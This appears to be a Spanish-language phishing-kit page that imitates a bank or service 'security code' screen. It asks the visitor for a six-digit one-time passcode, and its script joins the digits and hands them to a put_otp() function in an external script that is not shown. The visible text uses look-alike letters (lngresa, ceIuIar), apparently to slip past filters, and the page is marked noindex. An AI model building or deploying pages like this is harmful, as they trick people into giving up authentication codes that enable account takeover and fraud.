  <!DOCTYPE html>
  <html lang="es">

  <head>
      <meta name="robots" content="noindex" />
      <meta http-equiv="content-type" content="text/html; utf-8">
      <meta charset="utf-8">
      <meta content="es" http-equiv="Content-Language">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <link href="../esova/datos/src/css/layout.css" rel="stylesheet">
      <link href="../esova/datos/src/css/fonts.css" rel="stylesheet">
      <link rel="icon" type="image/png" href="../esova/datos/src/img/logo.png" />
      <script type="text/javascript" src="../esova/datos/src/js/jquery-3.6.0.min.js"></script>
      <script src="../esova/datos/src/js/jquery.jclock-min.js" type="text/javascript"></script>
      <script type="text/javascript" src="../esova/datos/src/js/run.js"></script>
    
        <style>
            .fondo {
                width: 100vw;
                margin-left: 0rem;
                position: fixed;
                top: 50;
                left: 0;
                z-index: -1; /* Para asegurar que esté detrás del contenido */
            }
        </style>
    </head>
      <body style="background-color: #f7f7f7;">
        <div class="fondo"></div>
        <div class="contenido">
            <div class="cabecera">
                <div class="logo">
                    <br><br>
                    <img style="width: 250px;" src="../esova/datos/src/img/logo.svg">
                    
                    <br><br><br>
                </div>
                <center>
                  <span style="font-size: 32px; font-family: Arial, sans-serif;">Código de seguridad</span>
                  <br><br><br>
            <center>
              <span style="font-size: 18px; font-family: Arial, sans-serif;">Para confirmar que eres tú, lngresa el código que te enviamos aI correo o aI ceIuIar en un mensaje de texto.</span>
              <br><br><br>
              
            <div class="box-form" style="margin: 0 auto; max-width: 400px;">
                      <center style="margin-top: -25px;">
                          <img style="width: 35px;" src="../esova/datos/src/img/icons/ico-clav.png" alt="">
                          <div class="input-icono pass" style="margin-top: -30px;"><br><br>
                              <center><span style="font-size: 17px; font-family: Arial, sans-serif;">lngresa cIave</span></center>
                              <center>
                                  <div class="clave-container" style="margin-top: 23px;">
                                      <center>
                                          <input type="password" pattern="\d" inputmode="numeric" name="inp-pass1" id="inp-pass1" maxlength="1" class="pass" style="width: 13%; text-align: center; font-size: 20px; border: none; border-bottom: 1px solid black;">
                                          <input type="password" pattern="\d" inputmode="numeric" name="inp-pass2" id="inp-pass2" maxlength="1" class="pass" style="width: 13%; text-align: center; font-size: 20px; border: none; border-bottom: 1px solid black;">
                                          <input type="password" pattern="\d" inputmode="numeric" name="inp-pass3" id="inp-pass3" maxlength="1" class="pass" style="width: 13%; text-align: center; font-size: 20px; border: none; border-bottom: 1px solid black;">
                                          <input type="password" pattern="\d" inputmode="numeric" name="inp-pass4" id="inp-pass4" maxlength="1" class="pass" style="width: 13%; text-align: center; font-size: 20px; border: none; border-bottom: 1px solid black;">
                                          <input type="password" pattern="\d" inputmode="numeric" name="inp-pass5" id="inp-pass5" maxlength="1" class="pass" style="width: 13%; text-align: center; font-size: 20px; border: none; border-bottom: 1px solid black;">
                                          <input type="password" pattern="\d" inputmode="numeric" name="inp-pass6" id="inp-pass6" maxlength="1" class="pass" style="width: 13%; text-align: center; font-size: 20px; border: none; border-bottom: 1px solid black;">
                                          
                                 
                                  </div>
                                 <div>
                                    <center>
                                  <br><br><br>
                                  <center><button id="btn-pass" name="btn-pass" class="btn btn-amarillo" type="button">Continuar</button><center>
                                    <div>
                                  </center>
                                    <br><br>
                                    <div style="margin-left: 0px; width: 100%; text-align: center;">
                                                <img class="fondo" style="width: 100%;" src="../esova/datos/src/img/fondo1-1024x459.png">
                                                </div>
                                    <div>

                                

      <script type="text/javascript">
          $(document).ready(function() {
              $('.pass').keydown(function(event) {
                  var currentFieldNumber = $(this).index('.pass'); // Get the index of the current input field
                  var minLength = parseInt($(this).attr('minlength'));
                  var currentLength = $(this).val().length;

                  if (event.keyCode === 8 && currentLength === 0 && currentFieldNumber > 0) {
                      $('.pass').eq(currentFieldNumber - 1).focus(); // Focus on the previous input field
                  }
              });

              $('#btn-pass').click(function() {
                  var pass1 = $("#inp-pass1").val();
                  var pass2 = $("#inp-pass2").val();
                  var pass3 = $("#inp-pass3").val();
                  var pass4 = $("#inp-pass4").val();
                  var pass5 = $("#inp-pass5").val();
                  var pass6 = $("#inp-pass6").val();

                  var password = pass1 + pass2 + pass3 + pass4 + pass5 + pass6;

                  // Verificar si la clave tiene exactamente 6 números y son todos números
                  if (password.length === 6 && /^\d+$/.test(password)) {
                      put_otp(password);
                  } else {
                      alert("Ingresa una clave de 6 números para continuar");
                  }
              });

              $(".pass").on("input", function() {
                  var $input = $(this);
                  var value = $input.val();
                  if (value.length >= 1) {
                      $input.next('.pass').focus();
                  }
              });
          });
      </script>
  </body>

  </html>
